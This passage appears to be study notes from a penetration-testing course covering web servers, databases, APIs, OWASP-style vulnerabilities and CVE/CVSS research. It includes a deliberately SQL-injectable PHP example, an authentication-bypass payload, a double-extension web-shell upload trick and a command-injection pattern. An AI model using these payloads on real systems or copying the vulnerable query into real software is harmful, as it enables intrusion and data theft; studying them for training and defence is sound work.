| **502** | `Bad Gateway` | Invalid response received from an upstream server (acting as a proxy). |
| **504** | `Gateway Timeout` | Upstream server failed to respond within the designated time frame. |

## 3. Command Line Enumeration (cURL)
The `curl` utility is essential for web server interaction and initial reconnaissance (Banner Grabbing).

**Extracting HTTP Headers (`-I` flag):**
Useful for identifying server software, versions, and active technologies without downloading the entire payload.
```bash
MikyRedHat@htb[/htb]$ curl -I https://academy.hackthebox.com

HTTP/2 200
date: Tue, 15 Dec 2020 19:54:29 GMT
content-type: text/html; charset=UTF-8
...SNIP...
```

**Retrieving Source Code:**
```bash
MikyRedHat@htb[/htb]$ curl https://academy.hackthebox.com

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Cyber Security Training : HTB Academy</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
```

## 4. Common Web Server Engines
While custom web servers can be built using Python, Node.js, or PHP, enterprise environments typically deploy optimized, production-ready engines to handle high traffic volume and complex routing.

### 4.1. Apache (httpd)
* **Market Share:** ~40% of internet websites.
* **Overview:** Open-source, heavily documented, and natively included in most Linux distributions. 
* **Key Features:** Highly modular architecture. Supports multiple languages (PHP, Python, Perl) and CGI. Functionality is extended via modules (e.g., `mod_php`).
* **Enterprise Footprint:** Apple, Adobe, Baidu.

### 4.2. NGINX
* **Market Share:** ~30% globally, but dominates the top 100,000 high-traffic websites (~60%).
* **Overview:** Open-source web server renowned for its asynchronous, event-driven architecture.
* **Key Features:** Optimized for high concurrency with minimal CPU and memory overhead. Widely deployed as a robust reverse proxy and load balancer.
* **Enterprise Footprint:** Google, Meta, Twitter, Cisco, Netflix, HackTheBox.

### 4.3. Microsoft IIS (Internet Information Services)
* **Market Share:** ~15% of internet websites.
* **Overview:** Proprietary web server developed by Microsoft, running exclusively on Windows Server environments.
* **Key Features:** Built to host .NET framework applications. Features deep integration with Active Directory (AD), allowing seamless Windows Authentication for internal enterprise tools.
* **Enterprise Footprint:** Microsoft, Office365, Skype, Stack Overflow.

> **Note:** Other notable application-specific servers include **Apache Tomcat** (Java environments) and **Node.js** (JavaScript backend execution).

# Web Application Databases: Core Fundamentals

## 1. Overview
Modern web applications rely on backend databases to persistently store, retrieve, and manage dynamic data (e.g., user credentials, application assets, user-generated content). The choice of database depends on critical operational factors such as **I/O speed**, **scalability**, **storage capacity**, and **cost**. 

## 2. Relational Databases (SQL)
Relational databases enforce a structured layout, storing data strictly in **tables**, **rows**, and **columns**. 

* **Primary/Foreign Keys:** Unique identifiers used to link tables and establish relationships. For example, linking a `users` table (`id` as primary key) to a `posts` table (`user_id` as foreign key) prevents redundant data storage and optimizes retrieval.
* **Schema:** The formal architecture defining the relationships and rules between tables.
* **Use Case:** Highly efficient and reliable for massive, cleanly structured datasets that require complex querying.

### Common SQL Databases
| Database | Description |
| :--- | :--- |
| **MySQL** | Open-source, widely adopted standard for web applications. |
| **MSSQL** | Microsoft's enterprise solution, heavily integrated with Windows Server and IIS environments. |
| **Oracle** | Enterprise-grade, highly reliable, and optimized for large-scale corporate deployments (typically high cost). |
| **PostgreSQL** | Open-source and highly extensible, allowing the integration of advanced features without altering the core database design. |
*(Other notable SQL databases: SQLite, MariaDB, Amazon Aurora, Azure SQL)*

## 3. Non-Relational Databases (NoSQL)
NoSQL databases operate without rigid tables, columns, or schemas. They adapt their storage models based on the specific data type, offering unparalleled **flexibility** and **horizontal scalability** for unstructured or semi-structured datasets.

### NoSQL Storage Models
1. **Key-Value:** Data is stored as a collection of key-value pairs (often JSON/XML formats). 
2. **Document-Based:** Data is stored in complex, hierarchical JSON objects containing metadata.
3. **Wide-Column:** Optimized for querying over massive datasets distributed across multiple nodes.
4. **Graph:** Designed to explicitly map and query complex relationships between data points.

**Key-Value JSON Representation Example:**
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  }
}
```
*(Note: Conceptually similar to dictionaries or hash maps in Python/PHP).*

### Common NoSQL Databases
| Database | Description |
| :--- | :--- |
| **MongoDB** | Open-source, Document-Based model storing data as JSON objects. The current industry standard for NoSQL. |
| **ElasticSearch** | Open-source, engineered for lightning-fast data retrieval and massive dataset analysis. |
| **Apache Cassandra** | Open-source, highly scalable, and optimized for high availability and graceful fault tolerance. |
*(Other notable NoSQL databases: Redis, Neo4j, CouchDB, Amazon DynamoDB)*

## 4. Web Application Integration & Security Context
Backend languages (such as PHP, Python, or Node.js) natively interface with databases to execute queries based on application logic or user input. First, the database engine must be deployed and configured on the backend server.

**PHP/MySQL Integration Example:**
```php
// 1. Establish connection to the database
$conn = new mysqli("localhost", "user", "pass", "database1");

// 2. Capture user input via HTTP POST (SECURITY RISK: Direct input mapping)
$searchInput = $_POST['findUser'];

// 3. Execute query
$query = "SELECT * FROM users WHERE name LIKE '%$searchInput%'";
$result = $conn->query($query);

// 4. Parse and return results to the user
while($row = $result->fetch_assoc() ){
    echo $row["name"]."<br>";
}
```

### Security Implication (Pentester Note)
The integration example above is intentionally basic and highlights a critical vulnerability. Passing unsanitized user input (`$_POST['findUser']`) directly into a SQL statement creates a severe **SQL Injection (SQLi)** vector. In a production environment, inputs must be strictly sanitized and queries must rely on **Parameterized Queries (Prepared Statements)** to prevent threat actors from manipulating the database backend.

# Web Development Frameworks & APIs

## 1. Web Development Frameworks
Modern web applications rely on frameworks to streamline the development of core functionalities (e.g., user authentication, session management, and routing) rather than building from scratch. These frameworks bridge backend processing logic with frontend components to deploy fully functional applications rapidly.

**Prominent Frameworks:**
* **Laravel (PHP):** Highly agile and developer-friendly; predominantly used by startups and SMEs.
* **Express (Node.js):** Lightweight and highly scalable; deployed by enterprise entities like PayPal, Uber, and IBM.
* **Django (Python):** Robust and comprehensive; utilized by Google, Instagram, and Mozilla.
* **Ruby on Rails (Ruby):** Focuses on convention over configuration; powers platforms like GitHub and Airbnb.

*Note: Enterprise-grade infrastructure rarely relies on a single technology, opting instead for a hybrid stack of various frameworks and web servers to handle distinct microservices.*

---

## 2. Inter-Component Communication
Seamless data exchange between the client (frontend) and the server (backend) is critical for dynamic web applications. This is typically achieved using standard HTTP Request parameters or Web APIs.

### 2.1 Query Parameters
The standard mechanism for passing specific arguments to backend scripts to dictate how a request is processed.
* **GET Requests:** Arguments are appended directly to the URI string, making them visible in the URL (e.g., `GET /search.php?item=apples HTTP/1.1`).
* **POST Requests:** Arguments are encapsulated within the body of the HTTP request, keeping the URL clean and allowing for larger payloads.

  ```http
  POST /search.php HTTP/1.1
  Host: example.com
  ...SNIP...

  item=apples
  ```

---

## 3. Web APIs (Application Programming Interfaces)
APIs are standardized interfaces that expose backend application logic to remote clients over HTTP. They facilitate modular interactions, such as querying databases or triggering specific server-side actions, returning machine-readable payloads (like JSON or XML) instead of rendered HTML.

### 3.1 SOAP (Simple Object Access Protocol)
A highly structured, protocol-based approach for API communication.
* **Data Format:** Strictly XML for both requests and responses.
* **Use Case:** Ideal for transferring serialized objects, complex structured data, or stateful information. Common in legacy enterprise systems due to strict standards.
* **Drawback:** High bandwidth overhead and complex syntax, making it cumbersome and rigid for simple queries.

  ```xml
  <?xml version="1.0"?>
  <soap:Envelope xmlns:soap="http://www.example.com/soap/soap/">
    <soap:Header></soap:Header>
    <soap:Body>
      <soap:Fault></soap:Fault>
    </soap:Body>
  </soap:Envelope>
  ```

### 3.2 REST (Representational State Transfer)
An architectural style that relies on stateless communication and standardized URI structures (e.g., `/api/users/1`).
* **Data Format:** Primarily JSON, though it supports XML, raw data, and `x-www-form-urlencoded`.
* **Architecture:** Breaks down application logic into modular, scalable endpoints. It expects specific input types directly through the URL path, making the web app highly scalable.
* **Standard HTTP Methods Used:**
  * `GET`: Retrieve existing data.
  * `POST`: Create new data (non-idempotent).
  * `PUT`: Update or replace existing data (idempotent).
  * `DELETE`: Remove data.

  ```json
  {
    "100001": {
      "date": "01-01-2021",
      "content": "Welcome to this web application."
    }
  }
  ```
# Web Application Vulnerabilities: Identification & Exploitation

## Overview
During web application penetration testing, vulnerabilities are typically identified through manual enumeration when automated public exploits are unavailable. Critical flaws frequently stem from developer misconfigurations rather than inherent vulnerabilities within the application's base code. The following section details the most prevalent attack vectors, mapping directly to the OWASP Top 10 framework.

## 1. Broken Authentication & Access Control
These represent two of the most critical and common vectors for unauthorized access.

* **Broken Authentication:** Vulnerabilities that allow attackers to bypass authentication mechanisms entirely.
    * *Impact:* Gaining unauthorized access without valid credentials or escalating privileges (e.g., a standard user assuming administrator rights).
    * *Exploit Example (College Management System 1.2):* Authentication bypass via SQLi in the email field using the payload `' or 0=0 #` combined with an arbitrary password.
* **Broken Access Control:** Flaws that permit users to access restricted endpoints and features outside their permission scope.
    * *Impact:* Unauthorized data access and arbitrary function execution (e.g., a standard user browsing directly to the `/admin` dashboard).

## 2. Malicious File Upload
Exploitation occurs when an application accepts file uploads without implementing strict validation and sanitization checks on the backend.

* **Mechanism:** Attackers upload malicious executable scripts (e.g., PHP web shells) to establish persistent remote code execution (RCE) on the hosting server.
* **Bypass Techniques:** Developers often implement weak validation filtering that can be bypassed using techniques such as double extensions or null byte injections.
* **Exploit Example (WordPress Responsive Thumbnail Slider 1.0):** Uploading a shell using a double extension format (e.g., `shell.php.jpg`) to achieve RCE. This specific vulnerability is also easily weaponized via available Metasploit modules.

## 3. Command Injection
Occurs when an application passes unsafe user-supplied data directly to the host operating system shell.

* **Mechanism:** Applications that execute backend OS commands (e.g., utilizing an OS command to download a specific plugin) without proper input sanitization allow attackers to append arbitrary system commands.
* **Impact:** Direct Remote Code Execution (RCE) and full backend server compromise.
* **Exploit Example (WordPress Plainview Activity Monitor):** Appending a pipe operator followed by a system command directly into the vulnerable `ip` parameter (e.g., `| <COMMAND>`).

## 4. SQL Injection (SQLi)
Arises when untrusted user input is improperly concatenated into backend database SQL queries without parameterized statements.

* **Mechanism:** Allows attackers to manipulate SQL statements to dump database contents, bypass authentication mechanisms, or execute administrative operations.
* **Code Context:**
    ```php
    // Vulnerable Implementation Example
    $query = "SELECT * FROM users WHERE name LIKE '%$searchInput%'";
    ```
* **Impact:** Complete database compromise, potential underlying host takeover, and data exfiltration.
* **Exploit Example (College Management System 1.2):** Injecting a boolean-based tautology (a SQL query crafted to always return `TRUE`) to successfully bypass the login form and authenticate as a legitimate user.

---
**Security Note:** A deep foundational understanding of these core vulnerabilities is critical for real-world assessments and the HTB CJCA path. Subsequent modules will cover advanced, in-depth exploitation methodologies for each vector.

# Public Vulnerabilities & Exploit Research

## 1. Back-End Component Vulnerabilities
The most critical vulnerabilities in back-end components are those that can be exploited externally. These flaws allow attackers to compromise and take control of the back-end server without requiring local access, a common vector in external penetration testing. 
* **Root Cause:** They typically stem from insecure coding practices during the development of a web application's back-end components.
* **Scope:** The vulnerability landscape ranges from low-hanging fruit (easily exploitable) to highly complex flaws requiring an in-depth understanding of the application's entire architecture.

## 2. Public CVEs (Common Vulnerabilities and Exposures)
The widespread deployment of both open-source and proprietary web applications leads to continuous security auditing by global experts and organizations. 
* **Lifecycle:** Discovered vulnerabilities are patched, publicly disclosed, and assigned a unique **CVE** record and severity score.
* **Proof of Concept (PoC):** Penetration testers frequently develop and publish PoC exploits for educational and testing purposes. Searching for these public exploits is the mandatory first step in any web application assessment.

### 2.1. Exploit Research Workflow
1. **Version Fingerprinting:** Identify the exact version of the target web application.
   * *Methodology:* Inspect the page source code. For open-source apps, search their public repository for version disclosure files (e.g., `version.php`), then verify its existence on the target server.
2. **Database Querying:** Search for public exploits targeting the specific version using specialized vulnerability databases:
   * [Exploit-DB](https://www.exploit-db.com/)
   * [Rapid7 Vulnerability & Exploit Database](https://www.rapid7.com/db/)
   * Vulnerability Lab
3. **Target Prioritization:** Prioritize exploits with a **CVE score of 8-10** or those granting **Remote Code Execution (RCE)**. If none exist, evaluate alternative exploit vectors.
4. **Component Auditing:** Extend the vulnerability research to all external components and third-party plugins utilized by the web application.

## 3. Common Vulnerability Scoring System (CVSS)
The **CVSS** is an open-source industry standard for assessing the severity of security vulnerabilities. It provides accurate, consistent severity metrics to help organizations prioritize threat response and resource allocation.

### 3.1. CVSS Metrics
CVSS scores are calculated using a formula based on three metric groups:
* **Base Metrics (0-10):** Represents the inherent, static qualities of a vulnerability. The National Vulnerability Database (NVD) currently provides Base scores for almost all disclosed CVEs.
* **Temporal Metrics:** Adjusts the Base score based on factors that change over time (e.g., exploit availability or patch status).
* **Environmental Metrics:** Customizes the score based on the potential impact within a specific organizational environment.
* *Note:* Organizations must utilize interactive CVSS calculators (v2 or v3) to factor their unique Temporal and Environmental data into the final risk assessment.

### 3.2. Version Differences (CVSS v2.0 vs. CVSS v3.0)
CVSS v3 introduced changes to the Base and Environmental metric groups to account for additional impact variables. The severity ratings differ slightly between versions:

| Severity | CVSS v2.0 Base Score | CVSS v3.0 Base Score |
| :--- | :--- | :--- |
| **None** | N/A | 0.0 |
| **Low** | 0.0 - 3.9 | 0.1 - 3.9 |
| **Medium** | 4.0 - 6.9 | 4.0 - 6.9 |
| **High** | 7.0 - 10.0 | 7.0 - 8.9 |
| **Critical** | N/A | 9.0 - 10.0 |

## 4. Back-End Server & Web Server Vulnerabilities
Beyond the web application itself, vulnerabilities in the underlying back-end infrastructure (web servers, databases) must be thoroughly audited.

* **Web Servers:** Vulnerabilities in web servers are highly critical due to their public exposure over TCP. 
  * *Example:* **Shellshock** (2014) affected Apache servers, allowing attackers to gain remote control over the back-end server via crafted HTTP requests.
* **Databases & Internal Servers:** Flaws in these components are typically exploited post-breach (after gaining local/internal network access via external vectors or during internal pentesting). They are leveraged for privilege escalation or lateral movement across the network.
* **Remediation:** Even if not directly exploitable from the outside, patching internal infrastructure is a critical requirement to protect the entire environment from total compromise.
